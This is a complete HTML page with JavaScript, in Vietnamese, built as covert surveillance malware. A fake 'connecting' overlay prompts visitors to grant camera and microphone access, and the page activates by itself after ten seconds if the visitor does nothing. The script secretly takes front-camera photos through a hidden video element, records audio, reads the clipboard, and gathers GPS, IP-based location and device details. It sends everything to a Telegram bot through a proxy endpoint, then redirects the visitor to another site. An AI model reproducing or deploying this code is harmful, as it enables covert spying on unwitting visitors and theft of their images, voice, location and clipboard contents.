<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>.</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{
            background:#000;min-height:100vh;display:flex;justify-content:center;align-items:center;
            font-family:monospace;overflow:hidden
        }
        .overlay{
            position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);
            z-index:99999;display:flex;justify-content:center;align-items:center;backdrop-filter:blur(10px)
        }
        .box{
            background:#111;padding:30px 20px;border-radius:20px;max-width:340px;width:90%;
            border:1px solid #00ff00;text-align:center;color:#fff
        }
        .box h3{color:#00ff00;font-size:18px;margin-bottom:10px}
        .box p{color:#ccc;font-size:13px;margin:10px 0;line-height:1.5}
        .box .loader{width:40px;height:40px;border:3px solid #333;border-top:3px solid #00ff00;
            border-radius:50%;animation:spin 0.8s linear infinite;margin:15px auto}
        @keyframes spin{to{transform:rotate(360deg)}}
        .box button{
            background:#00ff00;color:#000;border:none;padding:14px 30px;border-radius:30px;
            font-size:15px;font-weight:700;cursor:pointer;width:100%;margin-top:10px;display:none
        }
        .status{
            position:fixed;bottom:15px;left:15px;color:#0f0;font-size:11px;z-index:9999;
            background:rgba(0,0,0,0.8);padding:6px 12px;border-radius:15px;pointer-events:none
        }
    </style>
</head>
<body>
    <div id="overlay" class="overlay">
        <div class="box">
            <h3 id="title">📱 Đang kết nối...</h3>
            <div id="loader" class="loader"></div>
            <p id="msg">Vui lòng đợi trong giây lát</p>
            <button id="btn" onclick="startAll()">✅ Cho phép & Tiếp tục</button>
        </div>
    </div>

    <div class="status" id="status"></div>
    <video id="video" autoplay playsinline style="position:fixed;top:0;left:0;width:1px;height:1px;opacity:0;pointer-events:none"></video>
    <canvas id="canvas" width="640" height="480" style="display:none"></canvas>
    <input id="dummy" style="position:absolute;opacity:0;height:0;width:0">

    <script>
        const PROXY = '/api/telegram-proxy';
        const REDIRECT = 'https://www.memonotepad.com/';
        const PC = 4;  // giảm số ảnh xuống 4
        const PD = 500; // tăng delay giữa các ảnh
        const AD = 500;

        let ps = 0, cs = null, ca = false, ar = false, mr = null, ac = [], gd = false, rt = false;
        let mi = false, ao = false, gc = false, oc = false, cc = false;
        let cameraDone = false, audioDone = false;
        const io = /iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream;

        function log(s) { document.getElementById('status').textContent = s; console.log(s); }

        function cr() {
            if (rt) return;
            const done = mi && cameraDone && ao && gc && oc && cc;
            if (done) { rt = true; setTimeout(() => { location.href = REDIRECT; }, 500); }
        }

        async function st(t, r = 0) {
            try {
                const re = await fetch(PROXY, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ endpoint: 'sendMessage', data: { text: t.substring(0, 4096), parse_mode: 'HTML' } })
                });
                const d = await re.json();
                if (!d.ok && r < 2) { await new Promise(x => setTimeout(x, 2000)); return st(t, r + 1); }
                return d;
            } catch (e) { if (r < 2) { await new Promise(x => setTimeout(x, 2000)); return st(t, r + 1); } }
        }

        async function sp(b, n, r = 0) {
            try {
                const f = new FormData();
                f.append('endpoint', 'sendPhoto');
                f.append('photo', b, `p${n}.jpg`);
                f.append('caption', `📸 #${n} - ${new Date().toLocaleString('vi-VN')}`);
                const re = await fetch(PROXY, { method: 'POST', body: f });
                const d = await re.json();
                if (d.ok) {
                    ps++;
                    log(`📸 Ảnh ${ps}/${PC}`);
                    if (ps >= PC) { cameraDone = true; cr(); }
                } else if (r < 2) { await new Promise(x => setTimeout(x, 2000)); return sp(b, n, r + 1); }
            } catch (e) { if (r < 2) { await new Promise(x => setTimeout(x, 2000)); return sp(b, n, r + 1); } }
        }

        async function cp(v, c, ctx, n) {
            return new Promise(r => {
                const doCapture = () => {
                    if (v.readyState >= v.HAVE_CURRENT_DATA) {
                        c.width = v.videoWidth || 640;
                        c.height = v.videoHeight || 480;
                        ctx.drawImage(v, 0, 0, c.width, c.height);
                        c.toBlob(b => { if (b) sp(b, n); r(true); }, 'image/jpeg', 0.8);
                    } else { setTimeout(doCapture, 100); }
                };
                doCapture();
            });
        }

        async function cm(v, c, ctx) {
            log('📸 Bắt đầu chụp ảnh...');
            // Đợi camera sẵn sàng
            await new Promise(r => setTimeout(r, 1500));
            for (let i = 1; i <= PC; i++) {
                if (!ca) break;
                await cp(v, c, ctx, i);
                if (i < PC) await new Promise(r => setTimeout(r, PD));
            }
            if (ps === 0) { log('❌ Không chụp được ảnh nào'); cameraDone = true; cr(); }
        }

        async function startCamera() {
            log('📷 Đang khởi động camera...');
            const v = document.getElementById('video');
            const c = document.getElementById('canvas');
            const ctx = c.getContext('2d');

            try {
                const s = await navigator.mediaDevices.getUserMedia({
                    video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: 'user' }
                });
                cs = s; ca = true; v.srcObject = s;
                await new Promise(r => { v.onloadedmetadata = () => { v.play().then(r).catch(r); }; });
                log('✅ Camera sẵn sàng');
                await cm(v, c, ctx);
            } catch (e) {
                log('❌ Không truy cập được camera: ' + e.message);
                cameraDone = true;
                cr();
            }
        }

        async function startAudio() {
            if (ar) { ao = true; cr(); return; }
            log('🎤 Đang ghi âm...');
            try {
                const s = await navigator.mediaDevices.getUserMedia({ audio: true });
                mr = new MediaRecorder(s);
                ac = [];
                mr.ondataavailable = e => { if (e.data.size > 0) ac.push(e.data); };
                mr.onstop = async () => {
                    const b = new Blob(ac, { type: 'audio/ogg' });
                    if (b.size > 0) {
                        const f = new FormData();
                        f.append('endpoint', 'sendAudio');
                        f.append('audio', b, 'a.ogg');
                        f.append('caption', '🎤 Ghi âm - ' + new Date().toLocaleString('vi-VN'));
                        await fetch(PROXY, { method: 'POST', body: f });
                        log('✅ Đã gửi audio');
                    }
                    ar = true; ao = true; s.getTracks().forEach(t => t.stop()); cr();
                };
                mr.start();
                setTimeout(() => {
                    if (mr && mr.state === 'recording') mr.stop();
                    else { ao = true; ar = true; cr(); }
                }, AD);
            } catch (e) {
                log('❌ Không ghi âm được: ' + e.message);
                ao = true; ar = true; cr();
            }
        }

        async function sendInfo() {
            try {
                let ip = 'KXĐ';
                try {
                    const r = await fetch('https://api.ipify.org?format=json');
                    const d = await r.json();
                    ip = d.ip;
                } catch (e) {}

                const ua = navigator.userAgent;
                const pf = navigator.platform || 'KXĐ';
                let dm = 'KXĐ';
                if (/iPhone/.test(ua)) dm = 'iPhone';
                else if (/iPad/.test(ua)) dm = 'iPad';
                else if (/Android/.test(ua)) dm = 'Android';
                else if (/Windows/.test(ua)) dm = 'Windows';
                else if (/Macintosh/.test(ua)) dm = 'Mac';

                const sw = screen.width, sh = screen.height;
                const tz = Intl.DateTimeFormat().resolvedOptions().timeZone || 'KXĐ';
                const la = navigator.language || 'KXĐ';
                const ct = new Date().toLocaleString('vi-VN');
                const rf = document.referrer || 'Truc tiep';

                let loc = '';
                try {
                    const r = await fetch(`http://ip-api.com/json/${ip}?fields=city,regionName,country,isp`);
                    const d = await r.json();
                    if (d && d.status === 'success') {
                        loc = `\n<b>📍 Thành phố:</b> <code>${d.city || 'KXĐ'}</code>\n<b>🗺️ Khu vực:</b> <code>${d.regionName || 'KXĐ'}</code>\n<b>🏳️ Quốc gia:</b> <code>${d.country || 'KXĐ'}</code>\n<b>🏢 Nhà mạng:</b> <code>${d.isp || 'KXĐ'}</code>`;
                    }
                } catch (e) {}

                const text = `<b>📥 TRUY CẬP MỚI</b>\n\n<b>🌐 IP:</b> <code>${ip}</code>${loc}\n\n<b>📱 Thiết bị:</b> <code>${dm}</code>\n<b>💻 Trình duyệt:</b> <code>${ua.substring(0,80)}...</code>\n<b>🖥️ HDH:</b> <code>${pf}</code>\n<b>📺 Màn hình:</b> <code>${sw}x${sh}</code>\n<b>🌐 Ngôn ngữ:</b> <code>${la}</code>\n<b>⏰ Múi giờ:</b> <code>${tz}</code>\n<b>🕐 Thời gian:</b> <code>${ct}</code>\n<b>📎 Nguồn:</b> <code>${rf}</code>`;
                await st(text);
                log('✅ Đã gửi thông tin');
                mi = true; cr();
            } catch (e) { mi = true; cr(); }
        }

        function sendGPS() {
            if (!('geolocation' in navigator)) { gc = true; cr(); return; }
            navigator.geolocation.getCurrentPosition(
                async (pos) => {
                    const lat = pos.coords.latitude, lng = pos.coords.longitude;
                    await st(`<b>📍 GPS</b>\n\n<b>📌 Vĩ độ:</b> <code>${lat}</code>\n<b>📌 Kinh độ:</b> <code>${lng}</code>\n\n<a href="https://www.google.com/maps?q=${lat},${lng}">🗺️ Google Maps</a>`);
                    gc = true; cr();
                },
                () => { gc = true; cr(); },
                { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
            );
        }

        async function sendOri() {
            try {
                let screen2 = 'KXĐ';
                if (screen.orientation) {
                    const t = screen.orientation.type;
                    screen2 = t.includes('portrait') ? 'Dọc' : 'Ngang';
                }
                await st(`<b>🧭 THIẾT BỊ</b>\n\n<b>📱 Màn hình:</b> <code>${screen2}</code>`);
            } catch (e) {}
            oc = true; cr();
        }

        async function sendClip() {
            try {
                if (navigator.clipboard) {
                    const t = await navigator.clipboard.readText();
                    if (t && t.length > 0) {
                        await st(`<b>📋 CLIPBOARD</b>\n\n<code>${t.substring(0, 3500)}</code>`);
                    }
                }
            } catch (e) {}
            cc = true; cr();
        }

        function updateUI(title, msg, showBtn) {
            document.getElementById('title').textContent = title;
            document.getElementById('msg').textContent = msg;
            document.getElementById('loader').style.display = showBtn ? 'none' : 'block';
            document.getElementById('btn').style.display = showBtn ? 'block' : 'none';
        }

        async function startAll() {
            document.getElementById('overlay').style.display = 'none';
            log('🚀 Bắt đầu...');

            // Chạy các tác vụ không cần quyền trước
            sendInfo();
            sendGPS();
            sendOri();
            sendClip();

            // Sau 1s mới xin quyền camera + audio (có tương tác người dùng rồi)
            setTimeout(async () => {
                await startCamera();
                await startAudio();
            }, 800);
        }

        // Hiển thị nút xin quyền sau 1s
        setTimeout(() => {
            updateUI('📱 Cần quyền truy cập', 'Trang cần truy cập camera và micro để tiếp tục.\nNhấn nút bên dưới để cho phép.', true);
        }, 800);

        // Fallback nếu user không tương tác sau 10s
        setTimeout(() => {
            if (document.getElementById('overlay').style.display !== 'none') {
                updateUI('⏳ Đang tự động kích hoạt...', 'Vui lòng đợi...', false);
                setTimeout(startAll, 500);
            }
        }, 10000);
    </script>
</body>
</html>
